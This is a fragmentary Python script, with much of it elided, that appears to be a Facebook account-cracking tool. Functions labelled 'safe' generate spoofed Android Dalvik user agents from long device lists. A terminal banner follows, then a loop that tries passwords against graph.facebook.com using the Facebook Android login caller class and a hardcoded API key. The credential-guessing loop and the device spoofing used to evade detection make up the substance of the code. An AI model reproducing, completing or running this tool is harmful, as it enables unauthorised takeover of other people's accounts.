...
def random_dalvik_safe_superclean_2025(seed=None):
    if seed is not None:
        random.seed(seed)

    # Generic App Info (safe)
    APP_NAME = random.choice(["ClientApp", "MobileApp", "TestSuite", "NetClient"])
    APP_VER  = f"{random.randint(1,9)}.{random.randint(0,9)}.{random.randint(0,99)}"

    # Realistic 2024–2025 device list (safe)
    devices = [
        ("Samsung", "Galaxy A03"), ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A24"),
        ("Samsung", "Galaxy A34"), ("Samsung", "Galaxy A54"), ("Samsung", "Galaxy M33"),
        ("Xiaomi", "Redmi Note 11"), ("Xiaomi", "Redmi Note 12"), ("Xiaomi", "Poco X5 Pro"),
        ("Xiaomi", "Poco F5"), ("Xiaomi", "Redmi Note 13"),
        ("Realme", "Realme C55"), ("Realme", "Realme 10 Pro"), ("Realme", "Realme 11 Pro"),
        ("Vivo", "Vivo Y21"), ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V27e"),
        ("Oppo", "Oppo A57"), ("Oppo", "Oppo F21 Pro"),
        ("Tecno", "Tecno Spark 20"), ("Tecno", "Tecno Pova 5"),
        ("Infinix", "Infinix Hot 40"), ("Infinix", "Infinix Note 30"),
    ...
    # Fully safe build fingerprints (generic)
    build_fingerprint = random.choice([
        "UP1A.240205.002",
        "UP1A.231005.007",
        "TQ3A.230901.001"
    ])
    ...
    # Final Safe Dalvik UA
    ua = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/{build_fingerprint}) "
...
def random_dalvik_all_devices_safe_2025(seed=None):
    if seed:
        random.seed(seed)

    # App info (Safe generic)
    APP_NAME = random.choice(["ClientApp", "MobileApp", "TestSuite", "NetClient"])
    APP_VER  = f"{random.randint(1,10)}.{random.randint(0,9)}.{random.randint(0,99)}"

    # GIANT DEVICE LIST — All major brands & all popular models
    devices = [
        ...
        *[( "Samsung", m ) for m in [
            ...
            "Galaxy S22","Galaxy S23","Galaxy S23 Ultra","Galaxy S24","Galaxy S24 Plus"
        ]],
        ...
        *[( "Xiaomi", m ) for m in [
            ...
            "Poco M4 Pro","Poco X4 Pro","Poco X5 Pro","Poco X6 Pro",
        ...
        *[( "Vivo", m ) for m in [
            ...
            "Vivo V23","Vivo V25e","Vivo V27e","Vivo V29"
        ]],
        ...
        *[( "Oppo", m ) for m in [
        ...
        # ---------------- Infinix ----------------
        *[( "Infinix", m ) for m in [
            "Infinix Smart 7","Infinix Hot 30","Infinix Hot 40",
            "Infinix Note 12","Infinix Note 30","Infinix Note 40"
        ]],

        # ---------------- Tecno ----------------
        *[( "Tecno", m ) for m in [
            "Tecno Spark 10","Tecno Spark 20","Tecno Pova 4","Tecno Pova 5","Tecno Camon 20"
        ]],
        ...
        *[( "Motorola", m ) for m in [
        ...
        # ---------------- OnePlus ----------------
        *[( "OnePlus", m ) for m in [
            "OnePlus Nord N20","OnePlus Nord CE 2",
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 10.4
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_safe_superclean_2025(),
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_safe_2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
